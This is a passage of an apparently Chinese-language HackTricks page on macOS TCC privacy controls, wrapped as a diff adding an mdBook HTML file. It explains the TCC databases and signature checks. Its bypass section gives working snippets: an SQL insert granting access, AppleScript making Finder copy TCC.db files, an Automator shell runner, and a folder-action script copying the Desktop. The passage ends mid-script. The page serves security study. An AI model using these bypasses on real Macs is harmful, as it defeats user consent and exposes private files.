@@ -1,0 +1,727 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS TCC</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-tcc"><a class="header" href="#macos-tcc">macOS TCC</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="基本信息"><a class="header" href="#基本信息"><strong>基本信息</strong></a></h2>
+<p><strong>TCC（透明性、同意和控制）<strong>是一种安全协议，专注于规范应用程序权限。其主要作用是保护敏感功能，如</strong>位置服务、联系人、照片、麦克风、相机、辅助功能和完整磁盘访问</strong>。通过在授予应用程序访问这些元素之前强制要求用户明确同意，TCC增强了隐私和用户对其数据的控制。</p>
+<p>当应用程序请求访问受保护功能时，用户会遇到TCC。这通过一个提示可见，允许用户<strong>批准或拒绝访问</strong>。此外，TCC还支持用户的直接操作，例如<strong>将文件拖放到应用程序中</strong>，以授予对特定文件的访问，确保应用程序仅访问明确允许的内容。</p>
+<p><img src="https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855" alt="TCC提示的示例" /></p>
+<p><strong>TCC</strong>由位于<code>/System/Library/PrivateFrameworks/TCC.framework/Support/tccd</code>的<strong>守护进程</strong>处理，并在<code>/System/Library/LaunchDaemons/com.apple.tccd.system.plist</code>中配置（注册mach服务<code>com.apple.tccd.system</code>）。</p>
+<p>每个登录用户都有一个<strong>用户模式tccd</strong>在运行，定义在<code>/System/Library/LaunchAgents/com.apple.tccd.plist</code>中，注册mach服务<code>com.apple.tccd</code>和<code>com.apple.usernotifications.delegate.com.apple.tccd</code>。</p>
+<p>在这里，您可以看到tccd作为系统和用户运行：</p>
+<pre><code class="language-bash">ps -ef | grep tcc
+0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
+501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
+</code></pre>
+<p>权限是<strong>从父应用程序继承</strong>的，<strong>权限</strong>是<strong>根据</strong> <strong>Bundle ID</strong> 和 <strong>Developer ID</strong> <strong>跟踪</strong>的。</p>
+<h3 id="tcc-数据库"><a class="header" href="#tcc-数据库">TCC 数据库</a></h3>
+<p>允许/拒绝然后存储在一些 TCC 数据库中：</p>
+<ul>
+<li>系统范围的数据库在 <strong><code>/Library/Application Support/com.apple.TCC/TCC.db</code></strong>。</li>
+<li>该数据库是<strong>SIP 保护</strong>的，因此只有 SIP 绕过可以写入它。</li>
+<li>用户 TCC 数据库 <strong><code>$HOME/Library/Application Support/com.apple.TCC/TCC.db</code></strong> 用于每个用户的偏好设置。</li>
+<li>该数据库受到保护，因此只有具有高 TCC 权限的进程（如完全磁盘访问）可以写入它（但它不受 SIP 保护）。</li>
+</ul>
+<p>{% hint style="warning" %}
+之前的数据库也<strong>受到 TCC 保护以进行读取访问</strong>。因此，您<strong>无法读取</strong>常规用户 TCC 数据库，除非它来自具有 TCC 特权的进程。</p>
+<p>但是，请记住，具有这些高权限的进程（如 <strong>FDA</strong> 或 <strong><code>kTCCServiceEndpointSecurityClient</code></strong>）将能够写入用户的 TCC 数据库。
+{% endhint %}</p>
+<ul>
+<li>在 <strong><code>/var/db/locationd/clients.plist</code></strong> 中还有一个<strong>第三个</strong> TCC 数据库，用于指示允许<strong>访问位置服务</strong>的客户端。</li>
+<li>SIP 保护文件 <strong><code>/Users/carlospolop/Downloads/REG.db</code></strong>（也受到 TCC 的读取访问保护）包含所有<strong>有效 TCC 数据库</strong>的<strong>位置</strong>。</li>
+<li>SIP 保护文件 <strong><code>/Users/carlospolop/Downloads/MDMOverrides.plist</code></strong>（也受到 TCC 的读取访问保护）包含更多 TCC 授予的权限。</li>
+<li>SIP 保护文件 <strong><code>/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist</code></strong>（任何人可读）是需要 TCC 例外的应用程序的允许列表。</li>
+</ul>
+<p>{% hint style="success" %}
+iOS 中的 TCC 数据库在 <strong><code>/private/var/mobile/Library/TCC/TCC.db</code></strong>。
+{% endhint %}</p>
+<p>{% hint style="info" %}
+<strong>通知中心 UI</strong> 可以对<strong>系统 TCC 数据库</strong>进行<strong>更改</strong>：</p>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-bash">codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
+[..]
+com.apple.private.tcc.manager
+com.apple.rootless.storage.TCC
+</code></pre>
+<p>{% endcode %}</p>
+<p>然而，用户可以使用 <strong><code>tccutil</code></strong> 命令行工具 <strong>删除或查询规则</strong>。
+{% endhint %}</p>
+<h4 id="查询数据库"><a class="header" href="#查询数据库">查询数据库</a></h4>
+<p>{% tabs %}
+{% tab title="用户数据库" %}
+{% code overflow="wrap" %}</p>
+<pre><code class="language-bash">sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
+sqlite&gt; .schema
+# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
+# The table access contains the permissions per services
+sqlite&gt; select service, client, auth_value, auth_reason from access;
+kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
+kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
+kTCCServiceMicrophone|us.zoom.xos|2|2
+[...]
+
+# Check user approved permissions for telegram
+sqlite&gt; select * from access where client LIKE "%telegram%" and auth_value=2;
+# Check user denied permissions for telegram
+sqlite&gt; select * from access where client LIKE "%telegram%" and auth_value=0;
+</code></pre>
+<p>{% endcode %}
+{% endtab %}</p>
+<p>{% tab title="系统数据库" %}
+{% code overflow="wrap" %}</p>
+<pre><code class="language-bash">sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
+sqlite&gt; .schema
+# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
+# The table access contains the permissions per services
+sqlite&gt; select service, client, auth_value, auth_reason from access;
+kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
+kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
+kTCCServiceMicrophone|us.zoom.xos|2|2
+[...]
+
+# Get all FDA
+sqlite&gt; select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;
+
+# Check user approved permissions for telegram
+sqlite&gt; select * from access where client LIKE "%telegram%" and auth_value=2;
+# Check user denied permissions for telegram
+sqlite&gt; select * from access where client LIKE "%telegram%" and auth_value=0;
+</code></pre>
+<p>{% endcode %}
+{% endtab %}
+{% endtabs %}</p>
+<p>{% hint style="success" %}
+检查两个数据库，您可以查看应用程序允许、禁止或没有的权限（它会请求权限）。
+{% endhint %}</p>
+<ul>
+<li><strong><code>service</code></strong> 是 TCC <strong>权限</strong> 的字符串表示</li>
+<li><strong><code>client</code></strong> 是具有权限的 <strong>bundle ID</strong> 或 <strong>二进制文件路径</strong></li>
+<li><strong><code>client_type</code></strong> 指示它是 Bundle Identifier(0) 还是绝对路径(1)</li>
+</ul>
+<details>
+<summary>如果是绝对路径，如何执行</summary>
+<p>只需执行 <strong><code>launctl load you_bin.plist</code></strong>，plist 如下：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;!-- Label for the job --&gt;
+&lt;key&gt;Label&lt;/key&gt;
+&lt;string&gt;com.example.yourbinary&lt;/string&gt;
+
+&lt;!-- The path to the executable --&gt;
+&lt;key&gt;Program&lt;/key&gt;
+&lt;string&gt;/path/to/binary&lt;/string&gt;
+
+&lt;!-- Arguments to pass to the executable (if any) --&gt;
+&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+&lt;string&gt;arg1&lt;/string&gt;
+&lt;string&gt;arg2&lt;/string&gt;
+&lt;/array&gt;
+
+&lt;!-- Run at load --&gt;
+&lt;key&gt;RunAtLoad&lt;/key&gt;
+&lt;true/&gt;
+
+&lt;!-- Keep the job alive, restart if necessary --&gt;
+&lt;key&gt;KeepAlive&lt;/key&gt;
+&lt;true/&gt;
+
+&lt;!-- Standard output and error paths (optional) --&gt;
+&lt;key&gt;StandardOutPath&lt;/key&gt;
+&lt;string&gt;/tmp/YourBinary.stdout&lt;/string&gt;
+&lt;key&gt;StandardErrorPath&lt;/key&gt;
+&lt;string&gt;/tmp/YourBinary.stderr&lt;/string&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+</details>
+<ul>
+<li><strong><code>auth_value</code></strong> 可以有不同的值：denied(0)、unknown(1)、allowed(2) 或 limited(3)。</li>
+<li><strong><code>auth_reason</code></strong> 可以取以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)</li>
+<li><strong>csreq</strong> 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：</li>
+</ul>
+<pre><code class="language-bash"># Query to get cserq in printable hex
+select service, client, hex(csreq) from access where auth_value=2;
+
+# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
+BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
+echo "$BLOB" | xxd -r -p &gt; terminal-csreq.bin
+csreq -r- -t &lt; terminal-csreq.bin
+
+# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
+REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2&gt;&amp;1 | awk -F ' =&gt; ' '/designated/{print $2}')
+echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
+REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
+echo "X'$REQ_HEX'"
+</code></pre>
+<ul>
+<li>有关表中<strong>其他字段</strong>的更多信息，请<a href="https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive"><strong>查看这篇博客文章</strong></a>。</li>
+</ul>
+<p>您还可以在<code>系统偏好设置 --&gt; 安全性与隐私 --&gt; 隐私 --&gt; 文件和文件夹</code>中检查<strong>已授予的权限</strong>。</p>
+<p>{% hint style="success" %}
+用户_可以_ <strong>删除或查询规则</strong> 使用 <strong><code>tccutil</code></strong> 。
+{% endhint %}</p>
+<h4 id="重置-tcc-权限"><a class="header" href="#重置-tcc-权限">重置 TCC 权限</a></h4>
+<pre><code class="language-bash"># You can reset all the permissions given to an application with
+tccutil reset All app.some.id
+
+# Reset the permissions granted to all apps
+tccutil reset All
+</code></pre>
+<h3 id="tcc-签名检查"><a class="header" href="#tcc-签名检查">TCC 签名检查</a></h3>
+<p>TCC <strong>数据库</strong> 存储应用程序的 <strong>Bundle ID</strong>，但它也 <strong>存储</strong> <strong>信息</strong> 关于 <strong>签名</strong> 以 <strong>确保</strong> 请求使用权限的应用程序是正确的。</p>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-bash"># From sqlite
+sqlite&gt; select service, client, hex(csreq) from access where auth_value=2;
+#Get csreq
+
+# From bash
+echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - &gt; /tmp/telegram_csreq.bin
+## Get signature checks
+csreq -t -r /tmp/telegram_csreq.bin
+(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% hint style="warning" %}
+因此，使用相同名称和包 ID 的其他应用程序将无法访问授予其他应用程序的权限。
+{% endhint %}</p>
+<h3 id="权限与-tcc-权限"><a class="header" href="#权限与-tcc-权限">权限与 TCC 权限</a></h3>
+<p>应用程序<strong>不仅需要</strong>请求并获得对某些资源的<strong>访问权限</strong>，它们还需要<strong>拥有相关的权限</strong>。<br />
+例如，<strong>Telegram</strong> 拥有权限 <code>com.apple.security.device.camera</code> 来请求<strong>访问相机</strong>。一个<strong>没有</strong>此<strong>权限的应用程序将无法</strong>访问相机（用户甚至不会被询问权限）。</p>
+<p>然而，应用程序要<strong>访问</strong>某些用户文件夹，例如 <code>~/Desktop</code>、<code>~/Downloads</code> 和 <code>~/Documents</code>，它们<strong>不需要</strong>任何特定的<strong>权限</strong>。系统将透明地处理访问并<strong>根据需要提示用户</strong>。</p>
+<p>苹果的应用程序<strong>不会生成提示</strong>。它们在其<strong>权限</strong>列表中包含<strong>预授予的权限</strong>，这意味着它们<strong>永远不会生成弹出窗口</strong>，<strong>也不会</strong>出现在任何<strong>TCC 数据库</strong>中。例如：</p>
+<pre><code class="language-bash">codesign -dv --entitlements :- /System/Applications/Calendar.app
+[...]
+&lt;key&gt;com.apple.private.tcc.allow&lt;/key&gt;
+&lt;array&gt;
+&lt;string&gt;kTCCServiceReminders&lt;/string&gt;
+&lt;string&gt;kTCCServiceCalendar&lt;/string&gt;
+&lt;string&gt;kTCCServiceAddressBook&lt;/string&gt;
+&lt;/array&gt;
+</code></pre>
+<p>这将避免日历询问用户访问提醒、日历和地址簿。</p>
+<p>{% hint style="success" %}
+除了关于权限的一些官方文档外，还可以在 <a href="https://newosxbook.com/ent.jl"><strong>https://newosxbook.com/ent.jl</strong></a> 找到一些非官方的<strong>有趣信息</strong>。
+{% endhint %}</p>
+<p>一些 TCC 权限包括：kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... 没有公开的列表定义所有权限，但您可以查看这个 <a href="https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service"><strong>已知权限列表</strong></a>。</p>
+<h3 id="敏感未保护位置"><a class="header" href="#敏感未保护位置">敏感未保护位置</a></h3>
+<ul>
+<li>$HOME（本身）</li>
+<li>$HOME/.ssh, $HOME/.aws 等</li>
+<li>/tmp</li>
+</ul>
+<h3 id="用户意图--comapplemacl"><a class="header" href="#用户意图--comapplemacl">用户意图 / com.apple.macl</a></h3>
+<p>如前所述，可以通过将文件拖放到应用程序上来<strong>授予应用程序对文件的访问权限</strong>。此访问权限不会在任何 TCC 数据库中指定，而是作为文件的<strong>扩展</strong> <strong>属性</strong>。此属性将<strong>存储允许的应用程序的 UUID</strong>：</p>
+<pre><code class="language-bash">xattr Desktop/private.txt
+com.apple.macl
+
+# Check extra access to the file
+## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
+macl_read Desktop/private.txt
+Filename,Header,App UUID
+"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3
+
+# Get the UUID of the app
+otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
+uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
+</code></pre>
+<p>{% hint style="info" %}
+有趣的是，<strong><code>com.apple.macl</code></strong> 属性是由 <strong>Sandbox</strong> 管理的，而不是 tccd。</p>
+<p>还要注意，如果您将允许计算机上应用程序 UUID 的文件移动到另一台计算机，由于同一应用程序将具有不同的 UID，它将无法授予该应用程序访问权限。
+{% endhint %}</p>
+<p>扩展属性 <code>com.apple.macl</code> <strong>无法像其他扩展属性那样被清除</strong>，因为它是 <strong>受 SIP 保护的</strong>。然而，正如 <a href="https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/"><strong>在这篇文章中解释的</strong></a>，可以通过 <strong>压缩</strong> 文件、<strong>删除</strong> 它和 <strong>解压缩</strong> 它来禁用它。</p>
+<h2 id="tcc-权限提升与绕过"><a class="header" href="#tcc-权限提升与绕过">TCC 权限提升与绕过</a></h2>
+<h3 id="插入到-tcc"><a class="header" href="#插入到-tcc">插入到 TCC</a></h3>
+<p>如果您在某个时刻成功获得 TCC 数据库的写入访问权限，可以使用以下内容添加条目（删除注释）：</p>
+<details>
+<summary>插入到 TCC 示例</summary>
+```sql
+INSERT INTO access (
+service,
+client,
+client_type,
+auth_value,
+auth_reason,
+auth_version,
+csreq,
+policy_id,
+indirect_object_identifier_type,
+indirect_object_identifier,
+indirect_object_code_identity,
+flags,
+last_modified,
+pid,
+pid_version,
+boot_uuid,
+last_reminded
+) VALUES (
+'kTCCServiceSystemPolicyDesktopFolder', -- service
+'com.googlecode.iterm2', -- client
+0, -- client_type (0 - bundle id)
+2, -- auth_value  (2 - allowed)
+3, -- auth_reason (3 - "User Set")
+1, -- auth_version (always 1)
+X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+NULL, -- policy_id
+NULL, -- indirect_object_identifier_type
+'UNUSED', -- indirect_object_identifier - default value
+NULL, -- indirect_object_code_identity
+0, -- flags
+strftime('%s', 'now'), -- last_modified with default current timestamp
+NULL, -- assuming pid is an integer and optional
+NULL, -- assuming pid_version is an integer and optional
+'UNUSED', -- default value for boot_uuid
+strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
+</details>
+<h3 id="tcc-payloads"><a class="header" href="#tcc-payloads">TCC Payloads</a></h3>
+<p>如果你成功进入了一个具有某些 TCC 权限的应用程序，请查看以下页面以获取 TCC 负载以进行滥用：</p>
+<p>{% content-ref url="macos-tcc-payloads.md" %}
+<a href="macos-tcc-payloads.html">macos-tcc-payloads.md</a>
+{% endcontent-ref %}</p>
+<h3 id="apple-events"><a class="header" href="#apple-events">Apple Events</a></h3>
+<p>了解 Apple Events 的内容：</p>
+<p>{% content-ref url="macos-apple-events.md" %}
+<a href="macos-apple-events.html">macos-apple-events.md</a>
+{% endcontent-ref %}</p>
+<h3 id="automation-finder-to-fda"><a class="header" href="#automation-finder-to-fda">Automation (Finder) to FDA*</a></h3>
+<p>TCC 权限的名称是：<strong><code>kTCCServiceAppleEvents</code></strong><br />
+这个特定的 TCC 权限还指示了 <strong>可以在 TCC 数据库中管理的应用程序</strong>（因此权限并不允许管理所有内容）。</p>
+<p><strong>Finder</strong> 是一个 <strong>始终具有 FDA</strong> 的应用程序（即使它在 UI 中不显示），因此如果你对它拥有 <strong>Automation</strong> 权限，你可以滥用其权限以 <strong>执行某些操作</strong>。<br />
+在这种情况下，你的应用程序需要对 <strong><code>com.apple.Finder</code></strong> 拥有权限 <strong><code>kTCCServiceAppleEvents</code></strong>。</p>
+<p>{% tabs %}
+{% tab title="Steal users TCC.db" %}</p>
+<pre><code class="language-applescript"># This AppleScript will copy the system TCC database into /tmp
+osascript&lt;&lt;EOD
+tell application "Finder"
+set homeFolder to path to home folder as string
+set sourceFile to (homeFolder &amp; "Library:Application Support:com.apple.TCC:TCC.db") as alias
+set targetFolder to POSIX file "/tmp" as alias
+duplicate file sourceFile to targetFolder with replacing
+end tell
+EOD
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="窃取系统 TCC.db" %}</p>
+<pre><code class="language-applescript">osascript&lt;&lt;EOD
+tell application "Finder"
+set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
+set targetFolder to POSIX file "/tmp" as alias
+duplicate file sourceFile to targetFolder with replacing
+end tell
+EOD
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<p>您可以利用此权限<strong>编写您自己的用户 TCC 数据库</strong>。</p>
+<p>{% hint style="warning" %}
+拥有此权限后，您将能够<strong>请求 Finder 访问 TCC 限制的文件夹</strong>并获取文件，但据我所知，您<strong>无法使 Finder 执行任意代码</strong>以完全滥用其 FDA 访问权限。</p>
+<p>因此，您将无法滥用完整的 FDA 能力。
+{% endhint %}</p>
+<p>这是获取 Finder 自动化权限的 TCC 提示：</p>
+<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>
+<p>{% hint style="danger" %}
+请注意，由于<strong>Automator</strong> 应用具有 TCC 权限 <strong><code>kTCCServiceAppleEvents</code></strong>，它可以<strong>控制任何应用</strong>，如 Finder。因此，拥有控制 Automator 的权限后，您也可以使用如下代码控制<strong>Finder</strong>：
+{% endhint %}</p>
+<details>
+<summary>在 Automator 中获取 shell</summary>
+```applescript
+osascript<<EOD
+set theScript to "touch /tmp/something"
+<p>tell application "Automator"
+set actionID to Automator action id "com.apple.RunShellScript"
+tell (make new workflow)
+add actionID to it
+tell last Automator action
+set value of setting "inputMethod" to 1
+set value of setting "COMMAND_STRING" to theScript
+end tell
+execute it
+end tell
+activate
+end tell
+EOD</p>
+<h1 id="once-inside-the-shell-you-can-use-the-previous-code-to-make-finder-copy-the-tcc-databases-for-example-and-not-tcc-prompt-will-appear"><a class="header" href="#once-inside-the-shell-you-can-use-the-previous-code-to-make-finder-copy-the-tcc-databases-for-example-and-not-tcc-prompt-will-appear">Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear</a></h1>
+<pre><code>&lt;/details&gt;
+
+同样的情况发生在 **Script Editor app**，它可以控制 Finder，但使用 AppleScript 你无法强制它执行脚本。
+
+### 自动化 (SE) 到某些 TCC
+
+**系统事件可以创建文件夹操作，而文件夹操作可以访问一些 TCC 文件夹**（桌面、文档和下载），因此可以使用如下脚本来利用这种行为：
+```bash
+# Create script to execute with the action
+cat &gt; "/tmp/script.js" &lt;&lt;EOD
+var app = Application.currentApplication();
+app.includeStandardAdditions = true;
+app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
+EOD
+
+osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"
+
+# Create folder action with System Events in "$HOME/Desktop"
+osascript &lt;&lt;EOD
+tell application "System Events"
+-- Ensure Folder Actions are enabled
+set folder actions enabled to true
+
+-- Define the path to the folder and the script
+set homeFolder to path to home folder as text
+set folderPath to homeFolder &amp; "Desktop"
+set scriptPath to homeFolder &amp; "Library:Scripts:Folder Action Scripts:script.scpt"
+
+-- Create or get the Folder Action for the Desktop
+if not (exists folder action folderPath) then
+make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
+end if
+set myFolderAction to folder action folderPath
+
+-- Attach the script to the Folder Action
+if not (exists script scriptPath of myFolderAction) then
